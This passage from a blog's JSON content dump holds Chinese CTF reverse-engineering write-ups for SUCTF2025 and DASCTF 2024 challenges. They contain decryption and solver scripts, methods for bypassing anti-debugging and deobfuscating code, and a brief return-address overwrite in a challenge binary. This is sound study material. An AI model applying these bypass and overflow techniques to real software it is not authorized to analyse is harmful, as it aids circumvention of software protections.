的位置。\n输入的16字节刚好覆盖完ebp，接下来4字节将覆盖返回地址。结合题目的各种暗示也能想到，这里应该返回到为调用的 function1，其地址 0x40223D 按小端序对应 =\u0026quot;@，刚好补齐19字节。\n完整的调用流如下：\nmain --function2\t//encrypt-and-check ----function5\t// RC4 ------function3\t// RC4 KSA ------function4\t// RC4 PRGA --function0 ----(ret2)function1\t// sub index RC4解密，得到第一部分flag： We1com3ToReWorld=\u0026quot;@\n第二部分只需简单分析下 function1，逐字符与索引相减，写出逆运算求解：\ndata=[0x41,0x6D,0x62,0x4D,0x53,0x49,0x4E,0x29,0x28] for i in range(len(data)): data[i]+=i print(bytes(data)) #b\u0026#39;AndPWNT00\u0026#39; mineswepper # sub_1277 对输入的字节重新编码，经过分析是通过 sub_122B 实现换表hex\nabcdef0123456789 后面 sub_1432 是变种扫雷，给出每格以自身为中心3x3的雷数，用编码后的输入布雷。\n感觉和算法题有点像，写一个z3脚本\nfrom z3 import * import hashlib data = [ 0x03, 0x04, 0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0x02, 0xFF, 0xFF, 0x04, 0xFF, 0x07, 0xFF, 0xFF, 0xFF, 0x04, 0x06, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0x05, 0x06, 0x04, 0xFF, 0x05, 0xFF, 0x04, 0x07, 0xFF, 0x08, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0x06, 0x05, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0x03, 0xFF, 0x03, 0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x05, 0x04, 0x05, 0x07, 0x06, 0xFF, 0xFF, 0x04, 0xFF, 0x02, 0x01, 0xFF, 0xFF, 0xFF, 0x03, 0x04, 0xFF, 0xFF, 0x05, 0x04, 0x03, 0xFF, 0xFF, 0x07, 0x04, 0x03, 0xFF, 0xFF, 0x01, 0x01, 0xFF, 0xFF, 0x04, 0x03, 0xFF, 0x02, 0xFF, 0x04, 0x03, 0xFF, 0xFF, 0x02, 0xFF, 0x05, 0x04, 0xFF, 0xFF, 0x02, 0x02, 0xFF, 0xFF, 0x04, 0xFF, 0x04, 0xFF, 0x03, 0x05, 0x06, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0x02, 0xFF, 0xFF, 0xFF, 0x01, 0x04, 0xFF, 0xFF, 0x07, 0x05, 0xFF, 0xFF, 0x03, 0x03, 0x02, 0xFF, 0xFF, 0x04, 0xFF, 0xFF, 0x05, 0x07, 0xFF, 0x03, 0x02, 0x04, 0x04, 0xFF, 0x07, 0x05, 0x04, 0x03, 0xFF, 0xFF, 0x04, 0xFF, 0x02, 0x04, 0x05, 0xFF, 0xFF, 0x06, 0x05, 0x04, 0xFF, 0x02, 0xFF, 0xFF, 0x07, 0x04, 0xFF, 0xFF, 0x03, 0xFF, 0x04, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x03, 0x02, 0x02, 0xFF, 0xFF, 0x02, 0x04, 0x03, 0x05, 0xFF, 0xFF, 0x05, 0xFF, 0x04, 0xFF, 0x06, 0xFF, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0x03, 0xFF, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0xFF, 0x06, 0x06, 0xFF, 0x07, 0x06, 0x04, 0xFF, 0x04, 0x03, 0xFF, 0x04, 0x03, 0x05, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x06, 0x07, 0xFF, 0xFF, 0x04, 0xFF, 0xFF, 0xFF, 0x07, 0xFF, 0x05, 0xFF, 0x05, 0xFF, 0xFF, 0x06, 0x07, 0x07, 0xFF, 0x05, 0x06, 0x06, 0xFF, 0xFF, 0x02, 0x04, 0x04, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0xFF, 0xFF, 0x07, 0x07, 0x06, 0xFF, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0xFF, 0x03, 0x05, 0xFF, 0x07, 0xFF, 0x05, 0xFF, 0x06, 0xFF, 0x05, 0xFF, 0xFF, 0x07, 0x08, 0xFF, 0xFF, 0x03, 0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x06, 0x05, 0x03, 0xFF, 0x04, 0x05, 0x05, 0x03, 0xFF, 0xFF, 0x06, 0x05, 0x05, 0x06, 0xFF, 0x06, 0x05, 0x02, 0x04, 0x03, 0x04, 0xFF, 0xFF, 0x03, 0x04, 0x04, 0x06, 0x05, 0xFF, 0x03, 0xFF, 0x05, 0x05, 0x05, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0x04, 0xFF, 0xFF, 0x04, 0xFF, 0x07, 0x07, 0x08, 0x06, 0xFF, 0xFF, 0xFF, 0xFF, 0x05, 0xFF, 0xFF, 0xFF, 0x04, 0xFF, 0x03, 0xFF, 0x03, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x05, 0x03] minemap = [0 for count in range(400)] s = Solver() for i in range(20): for j in range(20): minemap[20*i+j] = Int(\u0026#34;x{:0\u0026gt;2d}_{:0\u0026gt;2d}\u0026#34;.format(i,j)) s.add(minemap[20*i+j] \u0026gt;= 0) s.add(minemap[20*i+j] \u0026lt;= 1) def getElement(i,j): if i\u0026gt;=0 and j\u0026gt;=0 and i\u0026lt;=19 and j\u0026lt;=19: return minemap[20*i+j] else: return 0 def addEq(i,j): eq = [] for x in range(-1,2,1): for y in range(-1,2,1): eq.append(getElement(i+x,y+j)) return sum(eq) for i in range(20): for j in range(20): num = data[20*i+j] if num != 0xFF: s.add(addEq(i,j) == num) if s.check() == sat: byte_map = [] result = s.model() for count in range(400): minemap[count] = result[minemap[count]].as_binary_string() for i in range(0,400,8): byte_str = \u0026#34;\u0026#34;.join(minemap[i:i+8])[::-1] byte = int(byte_str,2) byte_map.append(hex(byte)[2:].zfill(2)) hex_table = \u0026#34;0123456789abcdef\u0026#34; new_table = \u0026#34;abcdef0123456789\u0026#34; trans = str.maketrans(hex_table,new_table) flag_input = \u0026#34;\u0026#34;.join(byte_map) flag_input = flag_input.translate(trans) flag = hashlib.md5(flag_input.encode()).hexdigest() print(flag_input) print(\u0026#34;SUCTF{\u0026#34; + flag + \u0026#34;}\u0026#34;) ","date":"2025-01-13","externalUrl":null,"permalink":"/writeups/suctf2025/","section":"Writeups","summary":"reverse writeup of SUCTF2025","title":"SUCTF2025 Reverse","type":"writeups"},{"content":" DASCTF 2024暑期挑战赛｜为热爱，并肩作战 # DosSnake # re签到，DOS程序只能反汇编，不能继续反编译成c伪代码。\n汇编的代码量有点大，好在本题是游戏题，直接到最后面看flag的生成逻辑就行。简单的逐字节异或\nkey = b\u0026#34;DASCTF\u0026#34; data = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3F, 0x09, 0x63, 0x34, 0x32, 0x13, 0x2A, 0x2F, 0x2A, 0x37, 0x3C, 0x23, 0x00, 0x2E, 0x20, 0x10, 0x3A, 0x27, 0x2F, 0x24, 0x3A, 0x30, 0x75, 0x67, 0x65, 0x3C] for i in range(len(data)): data[i]^=key[i%6] print(bytes(data)) #b\u0026#39;DASCTF{H0wfUnnytheDosSnakeis!!!}\u0026#39; BabyAndroid # 说是baby，实际一点也不baby\n题目情境比较新颖，给出了apk程序和一份截取的加密流量，需要逆向apk来找出加密算法\nPOST / HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\ncharset: utf-8\nUser-Agent: Dalvik/2.1.0 (Linux; U; Android 11; M2004J7AC Build/RP1A.200720.011)\nHost: yuanshen.com\nConnection: close\nAccept-Encoding: gzip, deflate\nContent-Length: 413\ndata=TwMkYUkg4bYsY0hL99ggYWnVjWyXQrWAdNmToB0eBXbS6wBzL6ktorjNWI9VOroTU4\nHgIUYyzGLpcHzd1zNGT+bFZZI7IoxJwpcgXfdwW1LSmiNSP+PuSUsqAzNclF1nJ07b4tYyLWg0z\nTypbzWsLhOIM+6uci3RFZLREUCALafi01M8mS+KMNxX1Pyn8mSP+KKKjQ5S5fasHRSn+L9qB\nFws0mWavpfI0QEiMgarxv0iGhYU8cfgonWyL70RvoXET5VUDP1vfYWIBLzzzaAqLC0OiMtUK3T\nTATSU7yijdgXm18OKMcGIke/NZIM6Sr5fL3t6psDOOkw2C/5uYrJVPn+D6U9KTL64bgREppDq\nMOvhvbhtuf/S3ASW/+rhtPMtoaD8FxDg0wWSLZA53fQfNA==\n反编译之后，发现程序功能很多（代码很多）。先快速浏览了一下，在 model.sendRequest 找到了和流量POST请求相照应的函数 sendPost，内容也对应上一部分。说明程序最后调用这个函数发送流量。\n交叉引用，定位到函数 doInBackground。基本上整个加密的流程都在这里了，其中还涉及到解密dex文件和导入外部函数。下图分别用红线和蓝线做了标注：\n逐行分析。Sex.jpg 是一个被加密的文件，在 loadData 中进行RC4解密，恢复成dex文件。之后装载该dex文件中的类 site.qifen.note.ui.Encrypto，导入函数 encrypt。因为没配置动态调试的环境，所以在assert文件夹下手动提取出 Sex.jpg，进行解密。然后反编译该dex，找到 Encrypto 类。\n在原来的 site.qifen.note.ui 下还有一个类 Encrypt0（专门来混淆的，差点踩坑），不用管它。\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; void RC4decrypt(unsigned char *data,int data_len,unsigned char *key,int key_len) { unsigned char s_box[256],temp,t; int v0 = 0, v1 = 0, v2 = 0; for ( int i = 0; i \u0026lt; 256; ++i ) s_box[i] = i; for ( int k = 0; k \u0026lt; 256; ++k ) { v0 = (key[k % key_len] + v0 + s_box[k]) % 256; temp = s_box[k]; s_box[k] = s_box[v0]; s_box[v0] = temp; } for ( int m = 0; m \u0026lt; data_len; ++m ) { v1 = (v1 + 1) % 256; v2 = (v2 + s_box[v1]) % 256; t = s_box[v1]; s_box[v1] = s_box[v2]; s_box[v2] = t; data[m] ^= s_box[(s_box[v1] + s_box[v2]) % 256]; } } int main() { unsigned char buffer[0x800],key[]=\u0026#34;DASCTF\u0026#34;; FILE *srcfile = fopen(\u0026#34;C:\\\\Users\\\\LENOVO\\\\Desktop\\\\Sex.jpg\u0026#34;,\u0026#34;rb+\u0026#34;); FILE *dstfile = fopen(\u0026#34;C:\\\\Users\\\\LENOVO\\\\Desktop\\\\desex.dex\u0026#34;,\u0026#34;wb+\u0026#34;); memset(buffer,0,0x800); fread(buffer,sizeof(char),0x7AB,srcfile); RC4decrypt(buffer,0x7AB,key,6); fwrite(buffer,sizeof(char),0x7AB,dstfile); return 0; } encrypt调用了一个魔改的Hash算法，把 \u0026quot;DSACTF\u0026quot; 的16位Hash值作为key，进行ECB加密。最后转成Base64，就得到了流量中的加密部分。写脚本反过来解密即可。\nfrom Crypto.Cipher import AES import base64 def customhash(input_byte): temp = [0 for i in range(16)] for byte in input_byte: for j in range(16): ix = temp[j]*31 ix = (ix + byte) % 251 temp[j] = ix key = [t % 256 for t in temp] return bytes(key) unpad = lambda s: s[0:-ord(s[-1:])] key = customhash(b\u0026#34;DSACTF\u0026#34;) b64data = \u0026#34;TwMkYUkg4bYsY0hL99ggYWnVjWyXQrWAdNmToB0eBXbS6wBzL6ktorjNWI9VOroTU4HgIUYyzGLpcHzd1zNGT+bFZZI7IoxJwpcgXfdwW1LSmiNSP+PuSUsqAzNclF1nJ07b4tYyLWg0zTypbzWsLhOIM+6uci3RFZLREUCALafi01M8mS+KMNxX1Pyn8mSP+KKKjQ5S5fasHRSn+L9qBFws0mWavpfI0QEiMgarxv0iGhYU8cfgonWyL70RvoXET5VUDP1vfYWIBLzzzaAqLC0OiMtUK3TTATSU7yijdgXm18OKMcGIke/NZIM6Sr5fL3t6psDOOkw2C/5uYrJVPn+D6U9KTL64bgREppDqMOvhvbhtuf/S3ASW/+rhtPMtoaD8FxDg0wWSLZA53fQfNA==\u0026#34; data = base64.b64decode(b64data) cryptor = AES.new(key,AES.MODE_ECB) text=cryptor.decrypt(data) print(unpad(text)) #b\u0026#39;458.853181,-18.325492,-18.251911,-2.097520,-21.198660,-22.304648,21.103162,-5.786284,-15.248906,15.329286,16.919499,-19.669045,30.928253,-37.588034,-16.593954,-5.505211,3.014744,6.553616,31.131491,16.472500,6.802400,-78.278577,15.280099,3.893073,56.493581,-34.576344,30.146729,4.445671,6.732204\u0026#39; 解密的结果是一系列浮点数，还不是flag。重新回到关键函数 doInBackground，发现剩了一个 sendInit，这个函数在程序中只有声明没有定义。那么它应该是从外部的so文件导入的。找到 libnote.so 进行反编译。\nso文件中这个函数是 Java_site_qifen_note_ui_NoteActivity_sendInit\n在函数中看到了 cos((j+0.5)*(i*3.14159265)/v10)*v7 这样一个数学公式，当时在这里卡住了。赛后看其他选手的wp了解到是离散余弦变换。贴上师傅的脚本：\nfrom scipy.fftpack import dct, idct A = [458.853181,-18.325492,-18.251911,-2.097520,-21.198660,-22.304648, 21.103162,-5.786284,-15.248906,15.329286,16.919499,-19.669045, 30.928253,-37.588034,-16.593954,-5.505211,3.014744,6.553616, 31.131491,16.472500,6.802400,-78.278577,15.280099,3.893073, 56.493581,-34.576344,30.146729,4.445671,6.732204] #离散余弦变化逆变换 C = idct(A, norm=\u0026#39;ortho\u0026#39;) for i in range(len(C)): C[i] = round(C[i]) print(\u0026#39;\u0026#39;.join([chr(int(i)) for i in C])) #DASCTF{Y0u_Ar3Re4lly_H@ck3r!} DASCTF 2024八月开学季｜新生逐浪，热血向前 # Maze # 动调直接跑飞，应该有反调。用了ScyllaHide发现还是不行，先梳理一下流程\n最先执行 TlsCallback，发现是一个SMC，修改了 sub_140001A60\ninitterm 先于 main 进行初始化，依次调用 sub_140001000 和 sub_140001020\n/* .rdata:0000000140004290 ; const _PVFV qword_140004290 .rdata:0000000140004290 dq 0 .rdata:0000000140004298 dq offset ?pre_cpp_initialization@@YAXXZ .rdata:00000001400042A0 dq offset sub_140001000 .rdata:00000001400042A8 dq offset sub_140001020 .rdata:00000001400042B0 ; const _PVFV qword_1400042B0 .rdata:00000001400042B0 dq 0 */ initterm((_PVFV *)\u0026amp;qword_140004290, (_PVFV *)\u0026amp;qword_1400042B0); sub_140001000：GetProcAddress(hModule, “ZwSetInformationThread”) 动态调用 ZwSetInformationThread 反调试（如果程序正在被调试，则强制从调试器里分离出来）\nsub_140001020：新开线程，新线程调用的函数正是前面经过SMC的 sub_140001A60\n检测 Dr0-Dr3 硬件断点，切换地图\n最后来到主函数，读取字符，走迷宫\n如果不打算用硬件断点调试的话，只绕过第一个反调即可。接下来就可以分析迷宫\n全局变量dword_140006530在主线程和新线程中共享。主线程中其充当循环计数器，对应输入字符的索引。新线程中检测到其值改变，会根据奇偶在两个maze地图之间切换。另外发现，主线程中此循环变量自增后会Sleep挂起，为新线程切换地图留足时间，也就是说两个线程其实始终是同步运行的，这样一来就不用考虑竟态之类的问题。\n迷宫部分也和传统的形式不同，switch-case 定义了六个方向，说明是三维迷宫，多出来的 \u0026quot;u\u0026quot;,\u0026quot;n\u0026quot; 分别代表上和下。按照字符对应的方向持续移动，直到遇到1停止。\n地图是 8 x 8 x 8 的三维数组，起点索引是0（最底面的左上角），终点索引是436（6，6，4）\n可以考虑手动求解，或者写一个bfs来跑\nezcpp # 比较显眼的PEB反调，但并无影响，原因后面提到。\n动调发现 v10 一开始是虚函数表 Derived::vftable 的指针，sub_7FF73FDD1B20 把其动态修改成第二个参数，实际上是VT hook。后面 (unsigned __int8 (__fastcall *)(_QWORD))**v7)() 调用的都是hook后的函数。\n注意到hook了两次。第一次hook的函数显式抛出异常，跳过了try块后续的反调exit，只记录了调试情况。第二次则通过除零异常来到 except 块中的加密函数。\n继续跟进，加密函数申请了一段内存并预先写入固定数据，又显式抛出异常。异常处理部分，异或解密上述内存数据实现SMC。接着调用新的函数，变种XTEA。\nXTEA部分有一个不明来历的参数 a3 参与加密，动调发现是固定值1，不影响正常解密。看官方wp说代表是否被调试，应该是前面 _PEB-\u0026gt;BeingDebugged 的返回值。调试状态和未调试状分别能解出两个8字节字符串，合并起来才是flag。（这里没有提示，感觉偏脑洞了\n最后check，对硬编码的密文做了xor之后才和XTEA的结果比较。二者在内存中的形式是十进制字符串，类似 itoa，动调拿到数据即可解密。\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdint.h\u0026gt; void xtea_decry(uint64_t data, uint32_t a3, uint32_t *out) { uint32_t key[4]; key[0] = 0x42CA4455; key[1] = 0x8E0AE93B; key[2] = 0xA569C4D0; key[3] = 0x523A855B + a3; data = data ^ a3; uint32_t round = 32; uint32_t d1 = (data \u0026gt;\u0026gt; 32) \u0026amp; 0xFFFFFFFF; uint32_t d2 = data \u0026amp; 0xFFFFFFFF; uint32_t delta = 0xF3E56, number = delta * round; for (int i = 0; i \u0026lt; round; i++) { d2 -= ( ((d1\u0026lt;\u0026lt;4) ^ (d1\u0026gt;\u0026gt;5)) + d1) ^ (number + key[(number\u0026gt;\u0026gt;11) \u0026amp; 3]); number -= delta; d1 -= ( ((d2\u0026lt;\u0026lt;4) ^ (d2\u0026gt;\u0026gt;5)) + d2) ^ (number + key[number \u0026amp; 3]); } out[0] = ((d1 \u0026amp; 0xFF) \u0026lt;\u0026lt; 24) | (((d1 \u0026gt;\u0026gt; 8) \u0026amp; 0xFF) \u0026lt;\u0026lt; 16); out[0] |= (((d1 \u0026gt;\u0026gt; 16) \u0026amp; 0xFF) \u0026lt;\u0026lt; 8) | ((d1 \u0026gt;\u0026gt; 24) \u0026amp; 0xFF); out[1] = ((d2 \u0026amp; 0xFF) \u0026lt;\u0026lt; 24) | (((d2 \u0026gt;\u0026gt; 8) \u0026amp; 0xFF) \u0026lt;\u0026lt; 16); out[1] |= (((d2 \u0026gt;\u0026gt; 16) \u0026amp; 0xFF) \u0026lt;\u0026lt; 8) | ((d2 \u0026gt;\u0026gt; 24) \u0026amp; 0xFF); } int main() { uint8_t flag[32] = {0}; uint64_t data0 = 17529248803287439874ULL; uint64_t data1 = 12055721120662551337ULL; xtea_decry(data1, 1, (uint32_t *)flag); xtea_decry(data0, 0, (uint32_t *)flag + 2); printf(\u0026#34;%s\u0026#34;,flag); } DASCTF 2024最后一战｜寒夜破晓，冬至终章 # tryre # 签到题，IDA静态看看就能分析得差不多\n先换表Base64，之后逐字节异或 0x2。直接cyberchef梭\n黑客不许哭 # 程序无符号信息。但是经过分析，几个特殊函数以字符串常量保留了自身的函数名。由此推测功能\n可以看出和cuda有关（英伟达的通用GPU库）\n在文档中找到一些宏定义以及枚举变量，以方便分析。\n//CUDA memory copy types enum cudaMemcpyKind { cudaMemcpyHostToHost = 0;\t//Host -\u0026gt; Host cudaMemcpyHostToDevice = 1;\t//Host -\u0026gt; Device cudaMemcpyDeviceToHost = 2;\t//Device -\u0026gt; Host cudaMemcpyDeviceToDevice = 3;\t//Device -\u0026gt; Device cudaMemcpyDefault = 4;\t//inferred from the pointer values. } 加密部分整个运算过程都在用double类型，因为浮点精度问题，通过逆运算解密的效果可能不好，这里考虑爆破。单字节爆破即可。\n爆破过程中结合调试，发现每次得到结果都和check的密文刚好相差100。\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;math.h\u0026gt; int main() { unsigned long long encdata[44] = { 0x40B10696501E2585, 0x40B7EA4C5D638866, 0x40A0DD7DD1A21EA3, 0x40B755047D4E0978, 0x40C1EAEBA1FD156A, 0x40B814ADA31A4BDC, 0x40C802C39E8C47A1, 0x40AFF6A7A615A8DF, 0x40AA4164A3C64346, 0x40A2C755834091C1, 0x40A8FEE8FFDA4053, 0x40B3621E15011905, 0x40C025342C5E2CDC, 0x40A65E2036C9C0A9, 0x40905281565C2D28, 0x4090AE1F9D2BF552, 0x40A922F3E0157EED, 0x40B874F165C2D278, 0x40A99DE7B6FE2E6F, 0x4064172C9F2FDB90, 0x4082A661C68EC52A, 0x40A99BF2314013EC, 0x40B8E0C1F1F14984, 0x408A56DD68405B3A, 0x40B7252467CF1C32, 0x40A7CDDFD3B29A1C, 0x40C8E83135EB7458, 0x40A315184DFCE315, 0x409C8CA8B7E4DE3C, 0x40B327F640746456, 0x40B5F3DE9DF97AAB, 0x40AE167EEED8904F, 0x40B178FCD63CB817, 0x40C9A7D18476F2A6, 0x4099A285C5718EB9, 0x408E7B6FB86F47B6, 0x40A0FCC251E321A3, 0x40A1E3B0E1932D6F, 0x40A45B6A35B4EDB3, 0x40974258E8640208, 0x40C7DC0282E019B1, 0x40B1EC453A92A305, 0x40B2C35CF8B588E3, 0x40C975A6BC947065}; unsigned long long newbuf4[44] = { 0x404E425D046E0BBB, 0x40565E512BF5D8B8, 0x403807F2B4213872, 0x40552C14447517EC, 0x405A2AD9AF654289, 0x4054F066D7613C59, 0x40581A44A6E4B3A1, 0x4052D1537507F1FE, 0x404E2A6B8DC298FB, 0x40470D68C58C4673, 0x404C248F861F26DB, 0x4055AC1E8D98806B, 0x4054382EE9A71D0C, 0x404BA643C8564EC4, 0x40228603E483838D, 0x4034A091037CC6AF, 0x403F3092EE0B55F5, 0x405D0BF09991B04A, 0x403EDC239A70405A, 0x3FF10375A0B3084C, 0x40252ED23DE7CA70, 0x404BD327D12458CF, 0x405EBCD4229121F6, 0x401C90032C647FA6, 0x404BB99219281A65, 0x404F69DC68DC3E59, 0x405F53916405F1AA, 0x4046F8F189CB08B0, 0x404049328046AECF, 0x405717DDE2051F18, 0x405D6B8D70BC5387, 0x404FB611B00DAE6F, 0x4055057FF386071B, 0x405F536D3AFD1487, 0x403A812D835F129C, 0x402F378F374892AB, 0x4041D7F213D10431, 0x4042D635EB91F98C, 0x4038530805E42BBA, 0x4039B146B0E17FE6, 0x405D1DAF5CB6FEB2, 0x4055935E957A3B8B, 0x4053E1452099E93C, 0x005929B634E59ED1}; unsigned long long num1 = 0x3FF0526CF94CA8DB; unsigned long long num2 = 0x3FF0000000000000; double key1 = *(double*) \u0026amp;num1; double key2 = *(double*) \u0026amp;num2; double *key = (double*) newbuf4; double *check_data = (double*) encdata; char flag[45] = {0}; char table[] = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}-\u0026#34;; for(int i = 0; i\u0026lt;45; i++) { double data = check_data[i] - 100; for(int j = 0; j\u0026lt;66; j++) { double chr = (double)table[j]; double result = (chr * key1 + key2) * key[i]; if(fabs(result - data) \u0026lt; 0.000001) { flag[i] = table[j]; printf(\u0026#34;%s\\n\u0026#34;,flag); break; } } } return 0; } 刻板印象re # tlscallback 对加密函数 sub_40126C 进行inline hook，改成了 sub_41F000\nhook的结果是在原加密完成后再调用一个新的函数来加密，新函数是在内存中动态写入的。\n先来看原加密函数，有一段花指令干扰了反编译，nop掉之后分析。xor + XTEA + xor\n接下来，对内存中的这段函数进行分析，可以尝试如下思路：\ndump 动调时dump下来函数的机器码，重开一个IDA二次逆向\n反汇编后能看出混淆非常严重，整个函数被拆成若干个基本块，通过 jmp ebx 实现间接跳转，静态分析不能确定控制流的走向（感觉类似FLA）。\n在基本块内部也充斥着大量花指令，只有在 popa 和 pusha 之间的指令是有效的。\n脚本去花，之后勉强可以看出XXTEA特征，但是依然不能确定执行顺序。还是动态分析效果好一些\nIDA trace 先写脚本把内存中的机器码批量反汇编（非必须）\nimport idc import idautils start_ea = 0x63e4a1 current_ea = start_ea end_ea = start_ea + 0x4359 spec_asm = \u0026#39;jmp ebx\u0026#39; while current_ea \u0026lt;= end_ea: length = idc.create_insn(current_ea) if idc.generate_disasm_line(current_ea,0) == spec_asm: current_ea += length + 1 else: current_ea += length 关闭 \u0026ldquo;trace over debugger segments\u0026rdquo; 选项，之后F9运行自动trace。打开Tracing Window查看结果。我们关心的是debug段的指令顺序，所以对trace结果进行进一步处理。\ntrace_file = \u0026#34;trace.txt\u0026#34; output_file = \u0026#34;output.txt\u0026#34; trace = open(trace_file,\u0026#34;r+\u0026#34;) output = open(output_file,\u0026#34;w+\u0026#34;) def parse_line(line): if line: elements = line.split(\u0026#34;\\t\u0026#34;) dis_asm = elements[2].strip() return dis_asm else: return line skip = False while True: dis = parse_line(trace.readline()) if dis == \u0026#34;\u0026#34;: trace.close() output.close() break elif dis == \u0026#34;pusha\u0026#34;: skip = True elif dis == \u0026#34;popa\u0026#34;: skip = False else: if not skip: output.write(dis + \u0026#34;\\n\u0026#34;) x32dbg trace 思路差不多，参考官方wp，写表达式输出反汇编\n之后看汇编指令分析加密，基本没什么难度了，可以借助deepseek分析：\n变种XXTEA，delta改成了 0x11451419，后面逐字节异或。从trace结果中分别提取一下这两个加密的key，脚本解密\nmov byte ptr [ebp-48h], 7Bh ; \u0026#39;{\u0026#39; mov byte ptr [ebp-47h], 57h ; \u0026#39;W\u0026#39; mov byte ptr [ebp-46h], 68h ; \u0026#39;h\u0026#39; mov byte ptr [ebp-45h], 61h ; \u0026#39;a\u0026#39; mov byte ptr [ebp-44h], 74h ; \u0026#39;t\u0026#39; mov byte ptr [ebp-43h], 5Fh ; \u0026#39;_\u0026#39; mov byte ptr [ebp-42h], 69h ; \u0026#39;i\u0026#39; mov byte ptr [ebp-41h], 73h ; \u0026#39;s\u0026#39; mov byte ptr [ebp-40h], 5Fh ; \u0026#39;_\u0026#39; mov byte ptr [ebp-3Fh], 74h ; \u0026#39;t\u0026#39; mov byte ptr [ebp-3Eh], 68h ; \u0026#39;h\u0026#39; mov byte ptr [ebp-3Dh], 69h ; \u0026#39;i\u0026#39; mov byte ptr [ebp-3Ch], 73h ; \u0026#39;s\u0026#39; mov byte ptr [ebp-3Bh], 5Fh ; \u0026#39;_\u0026#39; mov byte ptr [ebp-3Ah], 3Fh ; \u0026#39;?\u0026#39; mov byte ptr [ebp-39h], 7Dh ; \u0026#39;}\u0026#39; #include\u0026lt;stdio.h\u0026gt; void xtea_decry(unsigned int *data, unsigned int *key) { unsigned int d1 = data[0], d2 = data[1]; unsigned int delta = 0x9e3779b9, number = delta * 32; for (int i = 0; i \u0026lt; 32; i++) { d2 -= ( ((d1\u0026lt;\u0026lt;4) ^ (d1\u0026gt;\u0026gt;5)) + d1) ^ (number + key[(number\u0026gt;\u0026gt;11) \u0026amp; 3]); number -= delta; d1 -= ( ((d2\u0026lt;\u0026lt;4) ^ (d2\u0026gt;\u0026gt;5)) + d2) ^ (number + key[number \u0026amp; 3]); } data[0] = d1; data[1] = d2; } void xxtea_decry(unsigned int *data, unsigned int *key,unsigned int n) { unsigned int rounds, e, y, z; unsigned int delta = 0x11451419, number; rounds = 6 + 52/n; number = delta * rounds; do { e = (number \u0026gt;\u0026gt; 2) \u0026amp; 3; for (int i = n-1; i\u0026gt;=0; i--) { y = data[(i+1)%n]; z = data[(i+n-1)%n]; data[i] -= ((y\u0026lt;\u0026lt;2 ^ z\u0026gt;\u0026gt;5) + (y\u0026gt;\u0026gt;3 ^ z\u0026lt;\u0026lt;4)) ^ ((number ^ y) + (z ^key[(e ^ i)\u0026amp;3])); } number -= delta; } while (--rounds); } int main() { char xtea_key[] = \u0026#34;{you_find_it_!?}\u0026#34;; char xxtea_key[] = \u0026#34;{What_is_this_?}\u0026#34;; unsigned char xor_key[] = \u0026#34;Laughter_is_poison_to_fear\u0026#34;; unsigned char xor_key1[] = { 0xDA, 0x30, 0x23, 0xE3, 0xDC, 0x39, 0x82, 0x60, 0xA5, 0x44, 0x68, 0xC2, 0x43, 0x7A, 0xBB, 0xE4, 0x50, 0xE1, 0x02, 0xC2, 0x81, 0x59, 0xEA, 0x1E, 0xC6, 0x8B, 0x71, 0x38, 0x27, 0x83, 0x94, 0xD8, 0xF4, 0x8D, 0x1A, 0x2A, 0x56, 0x8A, 0x4A, 0xD4, 0x54, 0xDC, 0x24, 0x3F, 0xB9, 0xED, 0x7B, 0x9A }; unsigned char xor_key2[] = { 0x8F, 0x6C, 0xA6, 0x3F, 0x94, 0x3D, 0xF5, 0xD9, 0x36, 0x66, 0x51, 0xD7, 0x66, 0x2F, 0xB3, 0x8F, 0xC0, 0x61, 0x9E, 0xCE, 0xE9, 0xD7, 0xE1, 0xBF, 0x13, 0x14, 0x16, 0x14, 0xC2, 0xE7, 0xC3, 0x3A, 0x7F, 0x94, 0xA1, 0xE7, 0x24, 0x0E, 0xA7, 0x5C, 0xD3, 0x77, 0xFE, 0x4F, 0x11, 0xDC, 0x69, 0x23 }; unsigned char Bdata[] = { 0x18, 0x09, 0x1C, 0x14, 0x37, 0x1D, 0x16, 0x2D, 0x3C, 0x05, 0x16, 0x3E, 0x02, 0x03, 0x10, 0x2C, 0x0E, 0x31, 0x39, 0x15, 0x04, 0x3A, 0x39, 0x03, 0x0D, 0x13, 0x2B, 0x3E, 0x06, 0x08, 0x37, 0x00, 0x17, 0x0B, 0x00, 0x1D, 0x1C, 0x00, 0x16, 0x06, 0x07, 0x17, 0x30, 0x03, 0x30, 0x06, 0x0A, 0x71, 0 }; unsigned int *Wdata = (unsigned int*)Bdata; unsigned int *Xkey = (unsigned int*)xtea_key; unsigned int *XXkey = (unsigned int*)xxtea_key; for(int i = 0; i \u0026lt; 48; i++) Bdata[i] ^= xor_key2[i]; xxtea_decry(Wdata,XXkey,0xC); for(int i = 0; i \u0026lt; 48; i++) Bdata[i] ^= xor_key1[i]; for(int j = 0; j \u0026lt; 12; j += 2) xtea_decry(Wdata+j, Xkey); for(int i = 0; i \u0026lt; 48; i++) Bdata[i] ^= xor_key[i%26]; printf(\u0026#34;%s\u0026#34;,Bdata); return 0; } 